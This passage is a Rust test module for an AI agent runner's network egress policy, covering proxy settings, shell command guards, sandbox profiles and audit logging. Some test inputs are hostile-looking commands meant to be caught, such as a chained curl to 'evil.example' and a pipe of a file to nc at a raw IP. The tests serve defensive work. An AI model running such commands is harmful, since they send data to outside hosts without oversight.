        let env = p.proxy_env();
        for k in PROXY_ENV_VARS {
            assert!(env
                .iter()
                .any(|(n, v)| n == k && v == "socks5h://127.0.0.1:9050"));
        }
        assert!(env
            .iter()
            .any(|(n, v)| *n == "NO_PROXY" && v == LOOPBACK_NO_PROXY));
    }

    #[test]
    fn http_connect_proxy_keeps_ipv6_brackets() {
        let p = policy_with(EgressConfig {
            proxy: Some("socks5h://[::1]:9050".into()),
            ..EgressConfig::default()
        });
        assert_eq!(p.http_connect_proxy().as_deref(), Some("http://[::1]:9050"));
        assert!(Url::parse(&p.http_connect_proxy().unwrap()).is_ok());
        assert_eq!(p.proxy_socket_addr().as_deref(), Some("::1:9050"));
    }

    #[test]
    fn guard_shell_blocks_disallowed_url_literals() {
        let p = policy_with(open_with(|c| c.allow_hosts = vec!["api.github.com".into()]));
        assert!(p.guard_shell("run_command", "ls -la").is_ok());
        assert!(p
            .guard_shell("run_command", "curl -s https://api.github.com/repos")
            .is_ok());
        let Err(err) = p.guard_shell("run_command", "echo hi; curl 'https://evil.example/x?a=1'")
        else {
            panic!("expected guard_shell denial");
        };
        assert!(err.to_string().contains("evil.example"), "{err}");
    }

    #[test]
    fn network_bin_detection_handles_paths_and_pipes() {
        assert!(mentions_network_bin("/usr/bin/curl -s x"));
        assert!(mentions_network_bin("cat f | nc 1.2.3.4 80"));
        assert!(!mentions_network_bin("ls -la && echo curling"));
    }

    #[test]
    fn claude_code_profile_drops_bash_under_proxy() {
        let direct = policy_with(EgressConfig::open());
        assert_eq!(direct.claude_code_profile("editor_shell"), "editor_shell");
        let proxied = policy_with(EgressConfig::default());
        assert_eq!(proxied.claude_code_profile("editor_shell"), "editor");
        assert_eq!(proxied.claude_code_profile("read_only"), "read_only");
    }

    #[test]
    fn sandbox_profile_allows_only_proxy_port() {
        let p = policy_with(EgressConfig {
            shell_network: SHELL_ISOLATED.into(),
            ..EgressConfig::default()
        });
        let profile = p.sandbox_profile();
        assert!(profile.contains("(deny network-outbound)"));
        assert!(profile.contains("localhost:9050"));
        let no_proxy = policy_with(open_with(|c| c.shell_network = SHELL_ISOLATED.into()));
        assert!(!no_proxy
            .sandbox_profile()
            .contains("allow network-outbound"));
    }

    /// Kernel-level check: under `isolated`, a direct connection is refused
    /// while the shell itself still runs.
    #[cfg(target_os = "macos")]
    #[test]
    fn isolated_shell_blocks_direct_network() {
        let p = policy_with(open_with(|c| c.shell_network = SHELL_ISOLATED.into()));
        let out = p
            .shell_command(
                "echo alive; /usr/bin/nc -z -G 2 1.1.1.1 443 && echo LEAK || echo BLOCKED",
            )
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("alive"), "{stdout}");
        assert!(stdout.contains("BLOCKED"), "{stdout}");
    }

    /// B1: only a denied / failed record reaches `tengu.log`, with its host
    /// (a shell command's URLs), tool, call id, status and reason.
    #[test]
    fn only_failures_are_mirrored_to_the_log() {
        let allowed = serde_json::json!({"tool": "hl_info", "verdict": "allowed", "host": "a"});
        assert_eq!(failure_fields(&allowed), None);
        assert_eq!(failure_fields(&serde_json::json!({"tool": "x"})), None);
        let denied = serde_json::json!({
            "tool": "http_request", "verdict": "denied", "host": "evil.example",
            "call_id": "chat:n:1:0:p", "reason": "host not allowed",
        });
        assert_eq!(
            failure_fields(&denied).unwrap(),
            [
                "denied",
                "http_request",
                "evil.example",
                "chat:n:1:0:p",
                "",
                "host not allowed"
            ]
            .map(String::from)
        );
        let shell = serde_json::json!({
            "tool": "run_command", "verdict": "error", "status": 503,
            "urls": ["https://a.example/x", "https://b.example"],
        });
        let f = failure_fields(&shell).unwrap();
        assert_eq!(f[2], "https://a.example/x https://b.example");
        assert_eq!(f[4], "503");
    }

    /// `tengu run`'s feed and loop calls share one process: an egress line
    /// written inside a call names its agent, session and call id in full;
    /// outside one, the record's own agent and the env still apply.
    #[tokio::test]
    async fn audit_lines_name_the_call_that_made_them() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("egress.jsonl");
        let policy = Arc::new(EgressPolicy {
            cfg: EgressConfig::open().resolved(),
            audit_path: Some(path.clone()),
        });
        let scope = CallScope {
            agent: "xm_weekend".into(),
            session: "feed:hl_ctx".into(),
            call_id: "feed:hl_ctx:1790775300000:0".into(),
        };
        let p = Arc::clone(&policy);
        audited_as(scope, async move {
            p.audit(serde_json::json!({"tool": "hl_info"}));
        })
        .await;
        policy.audit(serde_json::json!({"tool": "hl_info", "agent": "own"}));
        // A call-id-only scope (every agent's tool stack): agent and session
        // stay the process's.
        let p = Arc::clone(&policy);
        let ids_only = CallScope {
            agent: String::new(),
            session: String::new(),
            call_id: "chat:n:1:0:p".into(),
        };
        audited_as(ids_only, async move {
            p.audit(serde_json::json!({"tool": "http_request"}));
        })
        .await;
        let lines: Vec<Value> = std::fs::read_to_string(&path)
            .unwrap()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[2]["call_id"], "chat:n:1:0:p");
        let env_agent: Value = std::env::var("TENGU_AGENT_NAME").ok().into();
        assert_eq!(lines[2]["agent"], env_agent);
        assert!(lines.iter().all(|l| l["ts_ms"].as_i64().is_some()));
        assert!(lines.iter().all(|l| l.get("run_id").is_some()));
        assert_eq!(lines[0]["agent"], "xm_weekend");
        assert_eq!(lines[0]["session"], "feed:hl_ctx");
        assert_eq!(lines[0]["call_id"], "feed:hl_ctx:1790775300000:0");
        assert_eq!(lines[1]["agent"], "own");
        assert_eq!(lines[1]["call_id"], Value::Null);
        let env_session: Value = std::env::var("TENGU_SESSION_ID").ok().into();
        assert_eq!(lines[1]["session"], env_session);
    }

    #[test]
    fn call_sessions_name_feeds_and_loop_events() {
        let feed = CallSession::Fixed("feed:hl_book".into());
        assert_eq!(feed.of("feed:hl_book:1790775300000:3"), "feed:hl_book");
        let lp = CallSession::Loop("xm_main".into());
        assert_eq!(
            lp.of("xm_main:exit_tick:1790775300000:2"),
            "exit_tick:1790775300000"
        );
        assert_eq!(
            lp.of("xm_main:webhook-h-0f8c6a52-5d0e-4c8e-9a71-3b2f1c9d7e44:0"),
            "webhook-h-0f8c6a52-5d0e-4c8e-9a71-3b2f1c9d7e44"
        );
        // Not this loop's shape: the whole id.
        assert_eq!(lp.of("xm_mainx:s:1"), "xm_mainx:s:1");
        assert_eq!(lp.of("other:s:1"), "other:s:1");
    }

    /// Each call through `AttributedExecutor` runs under its own scope —
    /// concurrent calls on one task included; none outside it.
    #[tokio::test]
    async fn attributed_calls_run_under_their_scope() {
        struct Probe;
        #[async_trait::async_trait]
        impl ToolExecutor for Probe {
            async fn execute(&self, _c: &ToolCall, _m: &[Message]) -> Result<String> {
                tokio::task::yield_now().await;
                let s = call_scope().map(|s| (s.agent, s.session, s.call_id));
                Ok(serde_json::to_string(&s).unwrap())
            }
        }
        let ex = AttributedExecutor::new(
            Arc::new(Probe),
            "xm_exec",
            CallSession::Loop("xm_main".into()),
        );
        let call = |id: &str| ToolCall {
            id: id.into(),
            name: "hl_ctx".into(),
            arguments: serde_json::json!({}),
        };
        let (a, b) = (call("xm_main:s-1:2"), call("xm_main:s-2:0"));
        let (ra, rb) = tokio::join!(ex.execute_typed(&a, &[]), ex.execute(&b, &[]));
        assert_eq!(ra.unwrap().text, r#"["xm_exec","s-1","xm_main:s-1:2"]"#);
        assert_eq!(rb.unwrap(), r#"["xm_exec","s-2","xm_main:s-2:0"]"#);
        assert_eq!(Probe.execute(&a, &[]).await.unwrap(), "null");

        // The outermost scope names a call: a loop's over a stack's ids-only.
        let stack: Arc<dyn ToolExecutor> = Arc::new(AttributedExecutor::call_ids(Arc::new(Probe)));
        assert_eq!(
            stack.execute(&a, &[]).await.unwrap(),
            r#"["","","xm_main:s-1:2"]"#
        );
        let looped = AttributedExecutor::new(stack, "xm_exec", CallSession::Loop("xm_main".into()));
        assert_eq!(
            looped.execute(&a, &[]).await.unwrap(),
            r#"["xm_exec","s-1","xm_main:s-1:2"]"#
        );
    }

    #[test]
    fn the_run_id_is_the_processs_recording() {
        set_run_id(Some("2026-10-24T08-00-00Z-run"));
        assert_eq!(run_id().as_deref(), Some("2026-10-24T08-00-00Z-run"));
        set_run_id(None);
        assert_eq!(
            run_id(),
            std::env::var(RUN_ID_ENV).ok().filter(|v| !v.is_empty())
        );
    }
}
